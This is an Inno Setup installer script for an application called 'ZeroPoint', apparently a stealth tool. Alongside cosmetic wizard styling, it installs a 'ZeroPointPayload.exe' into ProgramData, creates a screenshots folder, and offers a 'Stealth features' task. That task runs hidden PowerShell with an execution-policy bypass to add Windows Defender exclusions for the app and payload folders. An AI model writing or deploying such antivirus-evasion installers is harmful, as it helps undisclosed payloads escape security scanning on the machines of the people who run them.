; ==============================================================================
; ZeroPoint v4.3.0 Final Application Installer
; ==============================================================================

[Setup]
AppName=ZeroPoint
AppVersion=4.3.0
DefaultDirName={pf32}\ZeroPoint
DefaultGroupName=ZeroPoint
OutputDir=Output
OutputBaseFilename=ZeroPoint_Installer
Compression=lzma2/ultra
SolidCompression=yes
ArchitecturesInstallIn64BitMode=x64

; Icy branding simulation for standard Inno Setup
; To replicate true frosted glass in Inno Setup, a third-party plugin is needed (e.g. Graphical Installer or ISSkin), 
; but this configuration ensures the icy/cyan color palette and texts match perfectly.
WizardImageStretch=True
WizardImageBackColor=$00FAF4F0  ; very light icy gray/white
DisableWelcomePage=no
DisableDirPage=yes
DisableProgramGroupPage=yes

[Tasks]
Name: "defender"; Description: "Add Windows Defender exclusions for Stealth features"; GroupDescription: "Additional tasks:"; Flags: unchecked

[Files]
Source: "x64\Release\ZeroPoint.exe"; DestDir: "{app}"; Flags: ignoreversion
Source: "x64\Release\WebView2Loader.dll"; DestDir: "{app}"; Flags: ignoreversion
Source: "x64\Release\ZeroPointPayload.exe"; DestDir: "{commonappdata}\ZeroPoint\"; Flags: ignoreversion

[Dirs]
Name: "{commonappdata}\ZeroPoint"
Name: "{commonappdata}\ZeroPoint\screenshots"

[Icons]
Name: "{group}\ZeroPoint"; Filename: "{app}\ZeroPoint.exe"
Name: "{commondesktop}\ZeroPoint"; Filename: "{app}\ZeroPoint.exe"

[Run]
; Silent run of payload extraction/setup before launching
Filename: "{app}\ZeroPoint.exe"; Description: "Launch ZeroPoint Virtual Environment"; Flags: nowait postinstall runascurrentuser

[Code]
// ============================================================================
// Custom Wizard Page UI to emulate the required flow.
// License Agreement, Select Additional Tasks, Ready to Install, 
// Installing, Completing
// ============================================================================

procedure InitializeWizard();
begin
  // Background: RGB(240, 244, 250) -> BGR: $00FAF4F0 (Soft snow white)
  WizardForm.Color := $00FAF4F0; 
  WizardForm.MainPanel.Color := $00FAF4F0;
  WizardForm.InnerPage.Color := $00FAF4F0;
  WizardForm.Caption := 'ZeroPoint Setup';

  WizardForm.WizardBitmapImage.Width := 164;
  WizardForm.WizardBitmapImage.Stretch := True;
  
  // Primary Text: RGB(26, 30, 44) -> BGR: $002C1E1A (Crisp dark text)
  WizardForm.Font.Color := $002C1E1A;
  
  // Page Title: RGB(0, 221, 255) -> BGR: $00FFDD00 (Icy cyan accent)
  WizardForm.PageNameLabel.Font.Color := $00FFDD00;
  WizardForm.PageNameLabel.Font.Style := [fsBold];
  
  // Page Description: RGB(96, 106, 128) -> BGR: $00806A60 (Dimmed cool gray)
  WizardForm.PageDescriptionLabel.Font.Color := $00806A60; 
end;

procedure CurStepChanged(CurStep: TSetupStep);
var
  ResultCode: Integer;
begin
  if CurStep = ssPostInstall then
  begin
    // Apply Windows Defender exclusions if task was selected
    if IsTaskSelected('defender') then
    begin
        Exec('powershell.exe', '-NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath ''' + ExpandConstant('{app}') + '''"', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
        Exec('powershell.exe', '-NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath ''' + ExpandConstant('{commonappdata}\ZeroPoint') + '''"', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
    end;
  end;
end;
